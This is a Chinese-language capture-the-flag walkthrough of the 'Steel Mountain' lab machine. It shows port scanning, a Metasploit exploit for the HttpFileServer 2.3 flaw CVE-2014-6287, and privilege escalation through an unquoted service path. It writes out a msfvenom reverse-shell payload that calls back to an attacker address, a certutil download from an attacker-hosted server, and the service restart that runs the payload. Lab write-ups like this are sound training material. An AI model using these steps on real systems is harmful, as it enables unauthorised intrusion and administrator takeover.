# Steel Mountain

nmap扫描

```shell
sudo nmap -sT --min-rate 10000 -p- 10.10.114.25   

PORT     STATE SERVICE
80/tcp   open  http
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3389/tcp open  ms-wbt-server
8080/tcp open  http-proxy
```

```shell
sudo nmap -sT -sV -sC -O -p80,135,139,445,3389,8080 10.10.114.25

PORT     STATE SERVICE            VERSION
80/tcp   open  http               Microsoft IIS httpd 8.5
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Microsoft-IIS/8.5
135/tcp  open  msrpc              Microsoft Windows RPC
139/tcp  open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds       Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
3389/tcp open  ssl/ms-wbt-server?
| ssl-cert: Subject: commonName=steelmountain
| Not valid before: 2025-05-03T06:31:49
|_Not valid after:  2025-11-02T06:31:49
|_ssl-date: 2025-05-04T06:40:51+00:00; 0s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: STEELMOUNTAIN
|   NetBIOS_Domain_Name: STEELMOUNTAIN
|   NetBIOS_Computer_Name: STEELMOUNTAIN
|   DNS_Domain_Name: steelmountain
|   DNS_Computer_Name: steelmountain
|   Product_Version: 6.3.9600
|_  System_Time: 2025-05-04T06:40:45+00:00
8080/tcp open  http               HttpFileServer httpd 2.3
|_http-title: HFS /
|_http-server-header: HFS 2.3

```

发现在8080端口上还运行着一个web服务 HttpFileServer 2.3

去exploit-db上找一下有没有相关的洞

找到一个rce的洞CVE-2014-6287

可以尝试利用一下

```shell
msfconsole

search CVE-2014-6287

use 0

set RHOSTS 10.10.114.25

set RPORT 8080

set LHOST 10.11.67.252

run

meterpreter > pwd
C:\Users\bill\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
```

成功getshell

将winpeas上传到目标机器进行信息搜集，为提权做准备

```
shell

upload /home/aca/winpeas.exe

winpeas.exe
```

发现一个**未加引号的服务路径**

```shell
AdvancedSystemCareService9(IObit - Advanced SystemCare Service 9)[C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe] - Auto - Running - No quotes and Space detected
    File Permissions: bill [WriteData/CreateFiles]
    Possible DLL Hijacking in binary folder: C:\Program Files (x86)\IObit\Advanced SystemCare (bill [WriteData/CreateFiles])
    Advanced SystemCare Service
```

```tex
Windows解析服务路径时，如果路径包含空格且未加引号，会按空格分段尝试执行。
攻击者可利用此特性，在更高优先级的路径位置放置恶意程序。

示例：
假设服务路径为：
C:\Program Files\My Tool\bin\service.exe
Windows会依次尝试执行：

C:\Program.exe（如果存在）

C:\Program Files\My.exe（如果存在）

C:\Program Files\My Tool\bin\service.exe（最终正确路径）

攻击方式：

攻击者在 C:\Program Files\ 下放置名为 My.exe 的恶意程序。

服务启动时，系统优先执行 My.exe 而非原程序。
```

生成一个恶意的payload

```shell
msfvenom -p windows/shell_reverse_tcp LHOST=10.11.67.252 LPORT=4444 -e x86/shikata_ga_nai -f exe-service -o Advanced.exe
```

上传该文件

```shell
python -m http.server 5555

certutil -urlcache -f http://10.11.67.252:5555/Advanced.exe advanced.exe
```

设置一个监听，停止然后重启该服务

```
sc stop AdvancedSystemCareService9

sc start AdvancedSystemCareService9
```

成功拿到管理员权限